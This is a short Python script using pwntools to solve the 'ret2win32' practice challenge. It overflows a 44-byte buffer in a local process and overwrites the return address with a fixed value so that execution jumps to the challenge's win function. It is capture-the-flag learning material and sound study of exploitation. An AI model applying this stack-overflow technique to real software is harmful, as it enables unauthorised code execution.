from pwn import *
import time
p=process("./ret2win32")
addr=p32(0x0804862c)
buffer=44
junk = b"A"*buffer
payload = b"a"*buffer + addr
p.sendline(payload)
time.sleep(1)
print(p.recv())